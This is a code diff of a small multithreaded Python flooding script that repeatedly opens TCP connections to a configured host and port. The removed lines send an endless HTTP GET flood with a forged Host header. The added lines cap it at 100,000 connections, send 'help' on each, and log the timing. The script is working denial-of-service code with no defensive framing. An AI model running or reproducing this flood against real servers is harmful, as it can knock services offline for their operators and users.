@@ -1,31 +1,34 @@
 import socket
 import threading
+from datetime import datetime
 
-from constraints import HOST, PORT 
+from consts import HOST, PORT 
 
 target  = HOST
 port = PORT
-fake_ip = '182.21.20.32'
-attack_num = 10
+attack_num = 0
+total_ttl = 0
+
 print("Sending Packets...")
 
 def attack():
-    while True:
+    global attack_num
+    global total_ttl
+    while attack_num < 100000:
       try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        global attack_num
+        start = datetime.now()
+        s = socket.socket()
         attack_num += 1
-        packesnum = attack_num
-        packesnum = str(packesnum)
-        print(f'Packets {packesnum} sending')
-        print(f'Packets {packesnum} sending done!')
+        s.connect((target, port))
+        s.send(str.encode('help'))
       except:
-         print(f'Packets {packesnum} sending failed')
+        print('An error occured')
       finally:
-         s.close()
+        end = datetime.now()
+        ttl = (end - start).total_seconds()
+        total_ttl += ttl
+        print(f'Packet {attack_num} sent, ttl: {round(ttl, 3)} seconds, mean_ttl: {round(total_ttl / attack_num, 3)} seconds')
+        s.close()
 
 for i in range(50):
     thread = threading.Thread(target=attack)
